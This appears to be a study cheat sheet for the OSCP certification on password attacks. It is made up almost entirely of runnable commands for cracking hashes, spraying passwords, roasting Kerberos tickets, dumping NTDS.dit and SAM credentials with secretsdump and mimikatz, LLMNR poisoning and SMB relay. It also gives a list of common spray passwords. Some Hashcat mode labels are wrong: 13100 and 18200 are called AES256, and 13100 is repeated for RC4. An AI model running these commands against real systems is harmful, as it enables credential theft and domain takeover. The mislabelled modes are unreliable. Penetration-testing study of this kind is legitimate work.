# Password Attacks Comprehensive Guide

## Table of Contents
1. [Password Attack Basics](#password-attack-basics)
2. [Hash Identification](#hash-identification)
3. [John the Ripper](#john-the-ripper)
4. [Hashcat](#hashcat)
5. [Password Spraying](#password-spraying)
6. [Kerberos Attacks](#kerberos-attacks)
7. [NTDS.dit Extraction](#ntdsdit-extraction)
8. [SAM/SYSTEM Extraction](#samsystem-extraction)
9. [Network Hash Capture](#network-hash-capture)
10. [Default Credentials](#default-credentials)
11. [OSCP Scenarios](#oscp-scenarios)

---

## Password Attack Basics

### Attack Types
- **Dictionary Attack**: Try wordlist of common passwords
- **Brute Force**: Try all possible combinations
- **Rule-Based Attack**: Apply transformations to wordlist
- **Hybrid Attack**: Combine wordlist with brute force
- **Rainbow Tables**: Precomputed hash tables
- **Password Spraying**: Try few passwords against many users
- **Credential Stuffing**: Use leaked credentials

### Common Hash Types
```
MD5:        32 chars    5f4dcc3b5aa765d61d8327deb882cf99
SHA1:       40 chars    5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
SHA256:     64 chars    5e884...
SHA512:     128 chars  b109f3...
NTLM:       32 chars    8846f7eaee8fb117ad06bdd830b7586c
```

---

## Hash Identification

### Using hash-identifier
```bash
hash-identifier
# Paste hash, tool identifies type
```

### Using hashid
```bash
hashid '$1$28772684$iEwNOgGugqO9.bIz5sk8k/'
# Analyzes and suggests hashcat mode
```

### Using haiti
```bash
haiti 5f4dcc3b5aa765d61d8327deb882cf99
# Modern hash identifier
```

### Manual Identification
```bash
# Length-based
echo -n "hash" | wc -c

# Format-based
MD5:         32 hex chars
SHA1:        40 hex chars
SHA256:      64 hex chars
NTLM:        32 hex chars
LM:          32 hex chars
NetNTLMv1:   Starts with username::domain
NetNTLMv2:   Starts with username::domain, longer
```

---

## John the Ripper

### Basic Usage

#### Crack with Wordlist
```bash
# Basic crack
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show hashes.txt

# Specific format
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
```

### Common Formats
```bash
# List all formats
john --list=formats

# Common formats:
--format=NT          # NTLM
--format=LM          # LM
--format=md5crypt    # MD5 (Unix)
--format=sha512crypt # SHA512 (Unix)
--format=descrypt    # DES (Unix)
--format=raw-md5     # Raw MD5
--format=raw-sha1    # Raw SHA1
--format=raw-sha256  # Raw SHA256
```

### Rule-Based Attacks

#### Using Built-in Rules
```bash
# List rules
john --list=rules

# Use single crack mode with rules
john --single --rules hashes.txt

# Wordlist + rules
john --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt

# Specific rule set
john --wordlist=wordlist.txt --rules=best64 hashes.txt
john --wordlist=wordlist.txt --rules=jumbo hashes.txt
```

#### Custom Rules
```bash
# Create custom rule in john.conf
[List.Rules:OSCP]
Az"[0-9]"          # Append digit
Az"[0-9][0-9]"     # Append 2 digits
c                  # Capitalize
c Az"[0-9]"        # Capitalize + digit
$!                 # Append !
$@                 # Append @

# Use custom rule
john --wordlist=wordlist.txt --rules=OSCP hashes.txt
```

### Incremental Mode (Brute Force)
```bash
# Default incremental
john --incremental hashes.txt

# ASCII incremental
john --incremental=ASCII hashes.txt

# Digits only
john --incremental=Digits hashes.txt

# Custom charset
john --incremental=LowerNum hashes.txt
```

### Cracking Specific Hashes

#### Linux Shadow File
```bash
# Unshadow first
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

#### Windows NTLM
```bash
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt ntlm.txt
```

#### ZIP Files
```bash
# Extract hash
zip2john file.zip > zip.hash

# Crack
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

#### RAR Files
```bash
rar2john file.rar > rar.hash
john --wordlist=/usr/share/wordlists/rockyou.txt rar.hash
```

#### SSH Private Keys
```bash
ssh2john id_rsa > ssh.hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
```

#### PDF Files
```bash
pdf2john file.pdf > pdf.hash
john --wordlist=/usr/share/wordlists/rockyou.txt pdf.hash
```

---

## Hashcat

### Basic Usage

#### Crack with Wordlist
```bash
# Basic attack
hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# -m: hash mode
# -a: attack mode (0=dictionary, 3=brute-force)

# Show cracked
hashcat -m 0 hashes.txt --show
```

### Common Hash Modes
```bash
# List all modes
hashcat --help | grep -i "hash"

# Common modes:
0     = MD5
100   = SHA1
1000  = NTLM
1400  = SHA256
1700  = SHA512
1800  = sha512crypt (Linux)
3000  = LM
5500  = NetNTLMv1
5600  = NetNTLMv2
13100 = Kerberos 5 TGS-REP (AES256)
18200 = Kerberos 5 AS-REP (AES256)
```

### Attack Modes

#### Dictionary Attack (Mode 0)
```bash
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
```

#### Combination Attack (Mode 1)
```bash
# Combine two wordlists
hashcat -m 0 -a 1 hashes.txt wordlist1.txt wordlist2.txt
```

#### Brute Force (Mode 3)
```bash
# 8-char lowercase + digits
hashcat -m 1000 -a 3 ntlm.txt ?l?l?l?l?d?d?d?d

# Charset reference:
# ?l = lowercase (abcdefghijklmnopqrstuvwxyz)
# ?u = uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)
# ?d = digits (0123456789)
# ?s = special chars
# ?a = all chars

# Examples:
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a    # 6 chars any
hashcat -m 0 -a 3 hash.txt Password?d?d   # Password01-99
```

#### Hybrid Attack (Mode 6/7)
```bash
# Wordlist + mask (append)
hashcat -m 1000 -a 6 ntlm.txt wordlist.txt ?d?d

# Mask + wordlist (prepend)
hashcat -m 1000 -a 7 ntlm.txt ?d?d wordlist.txt
```

### Rule-Based Attacks

#### Using Built-in Rules
```bash
# Best64 rules (most popular)
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Common rules:
/usr/share/hashcat/rules/best64.rule
/usr/share/hashcat/rules/d3ad0ne.rule
/usr/share/hashcat/rules/dive.rule
/usr/share/hashcat/rules/InsidePro-PasswordsPro.rule
```

#### Custom Rules
```bash
# Create custom.rule
c       # Capitalize first letter
u       # Uppercase all
l       # Lowercase all
$1      # Append "1"
$!      # Append "!"
$2$0$2$1  # Append "2021"
^P      # Prepend "P"

# Use custom rule
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r custom.rule

# Combine multiple rules
hashcat -m 1000 -a 0 ntlm.txt rockyou.txt -r rule1.rule -r rule2.rule
```

### Mask Attacks

#### Common Password Patterns
```bash
# Password + 2 digits
hashcat -m 1000 -a 3 ntlm.txt Password?d?d

# Company + year
hashcat -m 1000 -a 3 ntlm.txt Company?d?d?d?d

# Common patterns
hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?l?l?d?d    # First uppercase + 6 lower + 2 digits
hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d?d?d    # Password2024 pattern
```

### OSCP-Specific Hashcat

#### Crack NTLM
```bash
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Crack NetNTLMv2 (from Responder)
```bash
hashcat -m 5600 -a 0 netntlmv2.txt /usr/share/wordlists/rockyou.txt
```

#### Crack Kerberoast (TGS-REP)
```bash
hashcat -m 13100 -a 0 tgs.txt /usr/share/wordlists/rockyou.txt
```

#### Crack AS-REP Roast
```bash
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt
```

---

## Password Spraying

### Concept
Try a **few common passwords** against **many usernames** to avoid account lockouts.

### Tools

#### CrackMapExec
```bash
# SMB password spray
crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123' --continue-on-success

# Single password
crackmapexec smb 192.168.1.10 -u users.txt -p 'Welcome123'

# Multiple passwords
crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt
```

#### Kerbrute (Kerberos Spray)
```bash
# Install
go install github.com/ropnop/kerbrute@latest

# Password spray
kerbrute passwordspray -d domain.local users.txt 'Password123'

# Brute force users
kerbrute bruteuser -d domain.local passwords.txt Administrator
```

#### Hydra
```bash
# SSH spray
hydra -L users.txt -p 'Password123' ssh://192.168.1.10

# RDP spray
hydra -L users.txt -p 'Password123' rdp://192.168.1.10

# SMB spray
hydra -L users.txt -p 'Password123' smb://192.168.1.10
```

#### Spray (Python Script)
```bash
git clone https://github.com/Greenwolf/Spray
cd Spray
python spray.py -smb 192.168.1.10 users.txt passwords.txt 1 35 DOMAIN
```

### Common Spray Passwords
```
Password1
Password123
Welcome1
Welcome123
CompanyName2024
Summer2024
Winter2024
Spring2024
Fall2024
January2024
P@ssw0rd
P@ssw0rd1
Passw0rd!
admin123
Admin123
Password!
```

### Best Practices
- **Delay between attempts** (avoid lockout)
- **Check password policy** first
- **Use common passwords** only
- **Monitor for lockouts**
- **Try 3-5 passwords max** per spray

---

## Kerberos Attacks

### AS-REP Roasting

#### Enumerate Users without Kerberos Pre-Auth
```bash
# Impacket GetNPUsers
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip 192.168.1.10 -format hashcat

# With credentials
impacket-GetNPUsers domain.local/user:password -dc-ip 192.168.1.10

# Request specific user
impacket-GetNPUsers domain.local/user -no-pass -dc-ip 192.168.1.10
```

#### Crack AS-REP Hash
```bash
# Hashcat
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt asrep.txt
```

### Kerberoasting

#### Request TGS Tickets
```bash
# Impacket GetUserSPNs
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request

# Output to file
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request -outputfile tgs.txt

# Request specific SPN
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.1.10 -request-user svc_account
```

#### Crack TGS Hash
```bash
# Hashcat (TGS-REP AES256)
hashcat -m 13100 -a 0 tgs.txt /usr/share/wordlists/rockyou.txt

# Hashcat (TGS-REP RC4)
hashcat -m 13100 -a 0 tgs.txt /usr/share/wordlists/rockyou.txt

# John
john --wordlist=/usr/share/wordlists/rockyou.txt tgs.txt
```

---

## NTDS.dit Extraction

### What is NTDS.dit?
Active Directory database containing all domain credentials.

### Method 1: DCSync (Remote)

#### Using Impacket secretsdump
```bash
# With domain admin creds
impacket-secretsdump domain.local/Administrator:password@192.168.1.10

# Using NTLM hash
impacket-secretsdump -hashes :NTLMHASH domain.local/Administrator@192.168.1.10

# Save to file
impacket-secretsdump domain.local/Administrator:password@192.168.1.10 > ntds_dump.txt
```

#### Using Mimikatz (on DC)
```powershell
mimikatz # lsadump::dcsync /domain:domain.local /all /csv
```

### Method 2: Volume Shadow Copy

#### Create Shadow Copy
```cmd
# Create shadow copy
vssadmin create shadow /for=C:

# Note shadow copy device name
# Example: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

# Copy NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\ntds.dit

# Copy SYSTEM hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

#### Extract Hashes with secretsdump
```bash
# On Kali
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL

# Output to file
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL > ntds_hashes.txt
```

### Method 3: ntdsutil

#### On Domain Controller
```cmd
# Start ntdsutil
ntdsutil

# Create IFM backup
activate instance ntds
ifm
create full C:\temp\ntds_backup
quit
quit

# Transfer C:\temp\ntds_backup to attacker machine
```

#### Extract on Kali
```bash
impacket-secretsdump -ntds ntds_backup/Active\ Directory/ntds.dit -system ntds_backup/registry/SYSTEM LOCAL
```

### Cracking NTDS Hashes

#### Extract NTLM Hashes
```bash
# Format: domain\username:RID:LM:NTLM:::

# Extract only NTLM (4th field)
cat ntds_hashes.txt | cut -d':' -f4 > ntlm_only.txt

# Crack with hashcat
hashcat -m 1000 -a 0 ntlm_only.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## SAM/SYSTEM Extraction

### What is SAM?
Security Account Manager - stores local Windows credentials.

### Method 1: Registry Hives

#### Extract Registry Hives
```cmd
# Requires admin/SYSTEM
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
```

#### Dump with secretsdump
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

### Method 2: Shadow Copy
```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\temp\sam
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\system
```

### Method 3: Live System (Mimikatz)
```powershell
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::sam
```

---

## Network Hash Capture

### Responder (LLMNR/NBT-NS Poisoning)

#### Start Responder
```bash
# Basic
sudo responder -I eth0 -wv

# Analyze mode (don't poison, just listen)
sudo responder -I eth0 -A

# Force WPAD authentication
sudo responder -I eth0 -wFv
```

#### Crack Captured Hashes
```bash
# NetNTLMv2 hashes saved in:
/usr/share/responder/logs/

# Crack with hashcat
hashcat -m 5600 -a 0 NetNTLMv2.txt /usr/share/wordlists/rockyou.txt
```

### SMB Relay
```bash
# Disable SMB/HTTP in Responder.conf
sudo nano /usr/share/responder/Responder.conf
# Set SMB = Off, HTTP = Off

# Start Responder
sudo responder -I eth0 -v

# Start ntlmrelayx (different terminal)
impacket-ntlmrelayx -tf targets.txt -smb2support

# With command execution
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

## Default Credentials

### Common Default Passwords by Service

#### Databases
```
MySQL:      root / root, root / (blank)
PostgreSQL: postgres / postgres
MSSQL:      sa / sa, sa / (blank)
MongoDB:    (no auth by default)
Redis:      (no auth by default)
```

#### Web Applications
```
Tomcat:     tomcat / tomcat, admin / admin
Jenkins:    admin / password
Grafana:    admin / admin
Kibana:     elastic / changeme
```

#### Network Devices
```
Cisco:      cisco / cisco, admin / admin
Juniper:    netscreen / netscreen
HP:         admin / admin
```

#### Default Credential Lists
```bash
# SecLists
/usr/share/seclists/Passwords/Default-Credentials/

# Search for specific service
grep -i "tomcat" /usr/share/seclists/Passwords/Default-Credentials/*
```

---

## OSCP Scenarios

### Scenario 1: Crack NTLM Hash from LSASS Dump
```bash
# Dump provided or extracted
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Extract NTLM
echo '8846f7eaee8fb117ad06bdd830b7586c' > ntlm.txt

# Crack with hashcat
hashcat -m 1000 -a 0 ntlm.txt /usr/share/wordlists/rockyou.txt

# Result: password
```

### Scenario 2: Kerberoast and Crack
```bash
# Step 1: Request TGS
impacket-GetUserSPNs domain.local/user:pass -dc-ip 192.168.1.10 -request -outputfile tgs.txt

# Step 2: Crack
hashcat -m 13100 -a 0 tgs.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Step 3: Use cracked password
evil-winrm -i 192.168.1.10 -u svc_account -p 'cracked_password'
```

### Scenario 3: Password Spray to Domain Access
```bash
# Step 1: Enumerate users
kerbrute userenum -d domain.local users.txt --dc 192.168.1.10

# Step 2: Password spray
crackmapexec smb 192.168.1.10 -u valid_users.txt -p 'Password123' --continue-on-success

# Step 3: Found user:pass, use it
evil-winrm -i 192.168.1.10 -u found_user -p 'Password123'
```

---

## Tools Quick Reference

### Hash Cracking
```bash
# John
john --wordlist=rockyou.txt hash.txt
john --show hash.txt

# Hashcat
hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 hash.txt --show
```

### Password Spraying
```bash
# CrackMapExec
crackmapexec smb IP -u users.txt -p 'Password123'

# Kerbrute
kerbrute passwordspray -d domain.local users.txt 'Password123'
```

### Kerberos
```bash
# AS-REP Roast
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat

# Kerberoast
impacket-GetUserSPNs domain.local/user:pass -request
```

### Hash Extraction
```bash
# SAM/SYSTEM
impacket-secretsdump -sam sam -system system LOCAL

# NTDS.dit
impacket-secretsdump -ntds ntds.dit -system system LOCAL

# DCSync
impacket-secretsdump domain/admin:pass@DC_IP
```

---

**Remember**: Password attacks are fundamental to OSCP. Master hash cracking, password spraying, and credential extraction techniques!
